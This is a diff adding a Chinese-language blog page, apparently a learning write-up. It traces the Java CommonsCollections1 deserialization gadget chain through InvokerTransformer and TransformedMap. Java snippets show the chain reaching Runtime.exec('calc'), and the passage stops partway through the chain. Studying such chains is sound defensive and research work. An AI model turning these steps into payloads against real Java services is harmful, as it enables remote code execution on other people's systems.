@@ -1,0 +1,1705 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>CommonsCollections1 - DumKiy's blog</title>
+
+<meta name="description" content="流程图分析与复现本文章主要根据大佬白组长的视频进行学习记录，视频里详细分析了 TransformedMap 这条链，对 LazyMap 那一条链也进行了提点式的说明。一点一点跟完视频后收获非常多，在这里记录一下，由于还在学习基础阶段，因此记录得比较啰嗦。0x00 概述CommonsCollection1 反序列化...">
+<link rel="canonical" href="http://localhost:4000/java/2021/12/18/CommonsCollections1.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>CommonsCollections1</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2021-12-18-CommonsCollections1.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="CommonsCollections1"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=Deserialization+exploit+chain">Deserialization exploit chain</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Dec 18, 2021</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2021-12-18T22:39:49+08:00">
+    <meta itemprop="keywords" content="Deserialization exploit chain"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="流程图">流程图</h1>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639751474562-f689ba64-9760-4407-85a8-835329056295.jpeg" alt="img" /></p>
+
+<h1 id="分析与复现">分析与复现</h1>
+
+<p>本文章主要根据大佬白组长的视频进行学习记录，视频里详细分析了 TransformedMap 这条链，对 LazyMap 那一条链也进行了提点式的说明。一点一点跟完视频后收获非常多，在这里记录一下，由于还在学习基础阶段，因此记录得比较啰嗦。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639798551407-b2279f74-3aec-4eec-b3f7-b10909892ab3.png" alt="img" /></p>
+
+<h2 id="0x00-概述">0x00 概述</h2>
+
+<p>CommonsCollection1 反序列化利用链是一条 Commons-Collections 包中的利用链。</p>
+
+<h3 id="利用版本">利用版本</h3>
+
+<p>CommonsCollections 3.1 - 3.2.1</p>
+
+<h3 id="限制">限制</h3>
+
+<p>JDK版本：1.7 （8u71之后已修复不可利用）</p>
+
+<h2 id="0x01-前置准备">0x01 前置准备</h2>
+
+<h3 id="1-了解-commons-collection">1. 了解 Commons-Collection</h3>
+
+<p>在 Java 的 Collections API 中，大致可以划分为三种主要的类别：</p>
+
+<ol>
+  <li>容器类：如Collection、List、Map等，用于存放对象和进行简单操作的；</li>
+  <li>
+    <p>操作类：如Collections、Arrays等，用于对容器类的实例进行相对复杂操作如排序等；</p>
+  </li>
+  <li>辅助类：如Iterator、Comparator等，用于辅助操作类以及外部调用代码实现对容器类的操作，</li>
+</ol>
+
+<p><a href="https://commons.apache.org/proper/commons-collections/index.html">Apache Commons Collections</a> 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种 Java 应用的开发。Commons-Collection 为 Java 标准的 Collections API 提供了相当好的补充。</p>
+
+<p>包结构如下：</p>
+
+<pre><code class="language-plain">org.apache.commons.collections – Commons Collections自定义的一组公用的接口和工具类
+org.apache.commons.collections.bag – 实现Bag接口的一组类
+org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类
+org.apache.commons.collections.buffer – 实现Buffer接口的一组类
+org.apache.commons.collections.collection – 实现java.util.Collection接口的一组类
+org.apache.commons.collections.comparators – 实现java.util.Comparator接口的一组类
+org.apache.commons.collections.functors – Commons Collections自定义的一组功能类
+org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类
+org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类
+org.apache.commons.collections.list – 实现java.util.List接口的一组类
+org.apache.commons.collections.map – 实现Map系列接口的一组类
+org.apache.commons.collections.set – 实现Set系列接口的一组类
+</code></pre>
+
+<p>其实不做开发，不需要对这个包面临的需求以及具体使用了解得特别清楚，简单来看，这一个包可以对 java 中的常用数据结构进行操作。在后续的复现与分析过程中会对 Commons-Collection 中的一些数据结构做进一步了解。</p>
+
+<h3 id="2-复现环境准备">2. 复现环境准备</h3>
+
+<h4 id="21-从maven-获取-commons-collection">2.1 从maven 获取 Commons-Collection</h4>
+
+<p>可以去 maven repo 中搜索 common-collection：</p>
+
+<p>https://mvnrepository.com/artifact/commons-collections/commons-collections</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746426229-9ba1bb55-f924-4143-902c-fcf19c12eb35.png" alt="img" /></p>
+
+<p>选择下载 3.2.1 版本就可以了</p>
+
+<h4 id="22-jdk-版本选择">2.2 jdk 版本选择</h4>
+
+<p>CC1 利用链在 jdk 8u71 后被修复，复现时选择 jdk 8u65 即可。</p>
+
+<h4 id="23-从-openjdk-获取-jdk-源码">2.3 从 openjdk 获取 jdk 源码</h4>
+
+<p>我们在寻找利用链的时候，常常会用到 IDEA 中的 find Usage 功能，但该功能只在有 java 源码的情况下可以使用，如果第三方包只有 .class 文件，就没法自动搜索，且反编译后的源码阅读的成本也会增加。所以我们可以到 openjdk 中查找对应版本，利用一些关键词定位到对应版本。</p>
+
+<p>hg.openjdk.java.net/jdk8u/jdk8u/jdk/logs?rev=<code class="language-plaintext highlighter-rouge">修改文件的关键词</code></p>
+
+<p>例如查找CC1链修复前的一个版本的jdk源码：</p>
+
+<pre><code class="language-plain">hg.openjdk.java.net/jdk8u/jdk8u/jdk/logs?rev=annotationvocationhandler
+</code></pre>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746632039-34b62725-8ec7-44e9-a475-317d33324a5d.png" alt="img" /></p>
+
+<p>上图中对于 CC1 链的修复就是最上面的那一个，点进去后可以看到 parent，也就是修复的上一个版本。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746548668-bee586a4-10d2-43f7-9459-bbcc9f2ac17c.png" alt="img" /></p>
+
+<p>点击到 parent 就可以跳转到漏洞修复前的版本了。</p>
+
+<p>直接点击 zip 就可以下载了</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746552695-3ab903c3-2edc-4fbc-9260-01db06966d38.png" alt="img" /></p>
+
+<p>解压后 jdk 的代码在路径<code class="language-plaintext highlighter-rouge">jdk-af660750b2f4\src\share\classes</code>下</p>
+
+<p>以 CC1 链为例，将需要使用 sun 包复制一下。</p>
+
+<p>切换到 jdk 路径下，目录下的 src.zip 用于存放 Oralcle 自带的源码。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746654937-40b58da6-42cb-4b51-ad49-b13297848c47.png" alt="img" /></p>
+
+<p>用压缩软件打开</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746660731-86790228-1f30-4c78-a653-912a8ae23204.png" alt="img" /></p>
+
+<p>然后将前面解压出来的 sun 复制进去，如果出现权限错误，可以先拷贝到 c 盘。</p>
+
+<p>IDEA 会自动索引，这样就可以查看 sun 的源码了。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746666592-ed23f252-bc00-4e8f-ada8-a86720ff9c1a.png" alt="img" /></p>
+
+<h2 id="0x02-寻找触发点">0x02 寻找触发点</h2>
+
+<p>一个能成功执行的反序列化调用链需要三个元素：kick-off、sink、chain。翻译成中文来说就是 “入口点（重写了 readObject 的类）”、“sink 点（最终执行恶意动作的点：RCE…）”、“chain （中间的调用链）”。</p>
+
+<p>反序列化利用链的挖掘通常以反向寻找的方式进行。下面我们以 sink–&gt; chain –&gt; kick-off 的思路还原 CC1 利用链。</p>
+
+<p>反序列化利用链的触发点通常需要寻找一个可以序列化（实现了 Serializable 接口）并且存在一些敏感操作（例如 invoke 调用、文件读写等等）的类。拿到 common-collections，我们首先去定位一下敏感函数（使用 codeql、fortify、代码卫士等）。</p>
+
+<p>common-collections 源码可以使用 maven 下载，默认和 common-collections 放在同一目录下：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746721671-b080667c-0445-4c90-b9dc-6ab11c4aef39.png" alt="img" /></p>
+
+<p>自动化扫描这里不过多交代，CC1 链的触发点在 InvokerTransformer 类的 transform 方法中。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746771146-0d07f0a3-cbda-447e-bd91-212cf213c782.png" alt="img" /></p>
+
+<p>从 input 对象中获取 class 对象，通过 iMethodName，iParamTypes 获取相应的方法，然后传入 iArgs 参数，通过 invoke 调用相应的方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746815306-60ebb2c4-d48e-46f4-b0f9-cd9a1e6beec3.png" alt="img" /></p>
+
+<p>iMethodName、iParamTypes、iArgs 三个参数都可以在 InvokerTransformer 的构造函数中进行赋值。因此只要能够在反序列化中得到这个类，并且调用 transform 方法，就能够执行任意命令。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746788862-0a1ad510-38a3-43be-a8c7-7a4d67fbf8c8.png" alt="img" /></p>
+
+<p>另外，InvokerTransformer 类实现了 Serializable 接口，可以进行序列化和反序列化。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746779731-8cc92f07-f303-4664-81ac-b0522db27439.png" alt="img" /></p>
+
+<p>从上述的几个条件来看，InvokerTransformer 类就是一个绝佳的 “sink”。</p>
+
+<p>我们可以先手动尝试一下使用 InvokerTransformer 的 transform 执行任意命令。例如执行 <code class="language-plaintext highlighter-rouge">Runtime.getRuntime().exec("calc");</code></p>
+
+<p>构造函数需要传入：方法名（String）、参数类型（Class 数组）、参数（Object 数组）。</p>
+
+<ul>
+  <li>String methodName, Class[] paramTypes, Object[] args</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestInvokerTransformer</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">});</span>
+        <span class="n">invokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">());</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>成功弹出计算器。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746883437-a08801a4-04eb-4ff6-a86a-85c512139781.png" alt="img" /></p>
+
+<p>到这里，利用链暂时只有这一个节点，流程图长这样：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746887289-43490dbc-2eab-4e06-96cf-faa1d7e23bd5.png" alt="img" /></p>
+
+<h2 id="0x03-tramformedmap-调用链">0x03 TramformedMap 调用链</h2>
+
+<p>找到 sink 后，就需要反向寻找哪些类的哪些方法可以调用这个 transfrom 方法。可以使用 IDEA 中的 find Usages 功能来寻找。</p>
+
+<p>可以看到总共时 21 处调用，重点关注各种 jar 包中的调用。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746901491-7a3ea978-8ec4-4171-adff-e24e9860ee7c.png" alt="img" /></p>
+
+<p>其中有一个 TramformedMap</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746913597-0b688b1c-4c02-49e6-9ef5-801f24bdf432.png" alt="img" /></p>
+
+<p>TramformedMap 用于装饰一个 Map，构造函数提供一个 map 和两个 Transformer 对象。从名称中可以看出，keyTransformer 用于修饰 map 中的键，valueTransformer 用于修饰值，对键和值的操作就在这两个 Transformer 对象中定义，上面的 InvokerTransformer 类就是 Transformer 类的一个实现，所以这里当然也可以传入一个 InvokerTransformer 对象。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746960804-2d918b78-a7f2-44a9-aaa2-d2bbf2e9a92f.png" alt="img" /></p>
+
+<p>TramformedMap 在 checkSetValue 方法中对 transform 进行了调用：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746936314-002c27fc-139d-4366-a160-9ca09eff1527.png" alt="img" /></p>
+
+<p>这里的 valueTransformer 如果是一个 InvokerTransformer 对象，那就能够触发上面的任意代码执行。</p>
+
+<p>另外 TramformedMap 也是可以进行序列化的，因此 TramformedMap 可以作为我们反序列化中的一员。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746941240-8b554bfa-e5c9-40b6-9763-c4bd4d2e1a08.png" alt="img" /></p>
+
+<p>再往上找，我们需要寻找哪个类的哪个方法调用了 checkSetValue 方法。同样使用 IDEA 中的 find Usages 功能来寻找。</p>
+
+<p>可以看到在 AbstractInputCheckedMapDecorator 抽象类中的 MapEntry 类中，setValue 方法调用了 checkSetValue 方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746993639-6abea945-20a0-4b85-a73d-c6e5f7f37214.png" alt="img" /></p>
+
+<p>我们只要能够控制 parent</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639746999866-2e12c375-2d05-4091-ab25-55fc181948e0.png" alt="img" /></p>
+
+<p>那这个 MapEntry 的 setValue 方法在哪里会被调用呢？到这一步其实不需要再往上寻找，类比一下 HashMap 就可以知道这个方法应该如何调用。</p>
+
+<p>熟悉 Java HashMap 的话应该知道：</p>
+
+<p>HashMap 继承自 AbstractMap，而 AbstractMap 实现了 Map 接口，Map 接口中包含了一个 Entry 接口。</p>
+
+<p>HashMap 在遍历时就会用到 Map.Entry 接口，并且 entry 对象可以使用 setValue 方法在修改值，示例代码如下：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="nc">Map</span><span class="o">&lt;</span><span class="nc">Integer</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">Integer</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">&gt;();</span>
+		<span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="mi">10</span><span class="o">);</span>
+		<span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="mi">20</span><span class="o">);</span>
+ 
+		<span class="c1">// Iterating entries using a For Each loop</span>
+		<span class="k">for</span> <span class="o">(</span><span class="nc">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="nc">Integer</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">map</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
+			<span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Key = "</span> <span class="o">+</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">()</span> <span class="o">+</span> <span class="s">", Value = "</span> <span class="o">+</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
+		<span class="o">}</span>
+</code></pre></div></div>
+
+<p>类比 HashMap：</p>
+
+<p>TramformedMap 继承自 AbstractInputCheckedMapDecorator ，AbstractInputCheckedMapDecorator 继承自 AbstractMapDecorator，而 AbstractMapDecorator 实现了 Map.Entry 接口，并且 AbstractInputCheckedMapDecorator.MapEntry 重写了 setValue 方法。</p>
+
+<p>也就是说我们可以获取 TramformedMap 的 entry，然后调用 setValue 方法。进而触发后面的利用链。</p>
+
+<p>流程如下：</p>
+
+<ul>
+  <li>创建 TramformedMap 对象。</li>
+  <li>
+    <p>以 entry 的形式遍历该对象。</p>
+  </li>
+  <li>调用 setValue 方法。该方法传入 value ，然后调用 TramformedMap.checkSetValue 方法。</li>
+  <li>
+    <p>TramformedMap.checkSetValue 方法调用 valueTransformer.transform(value); 这里的 valueTransformer 就是我们在 decorate 时传入的 invokerTransformer。</p>
+  </li>
+  <li>由于目标是调用 invokerTransformer.transform(Runtime.getRuntime())。因此 setValue 时需要传入 Runtime.getRuntime()。</li>
+</ul>
+
+<p>于是我们可以编写如下代码，观察是否能够成功弹出计算器。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestInvokerTransformer</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="s">"calc"</span><span class="o">});</span>
+        <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"key"</span><span class="o">,</span><span class="s">"value"</span><span class="o">);</span>
+
+        <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">transformedMap</span> <span class="o">=</span> <span class="nc">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="n">invokerTransformer</span><span class="o">);</span>
+
+        <span class="k">for</span> <span class="o">(</span><span class="nc">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="nl">entry:</span> <span class="n">transformedMap</span><span class="o">.</span><span class="na">entrySet</span><span class="o">()){</span>
+            <span class="n">entry</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">());</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639747024162-04074958-3ab8-4eb2-b9d3-2aef410541fa.png" alt="img" /></p>
+
+<p>至此，利用链如下：</p>
+
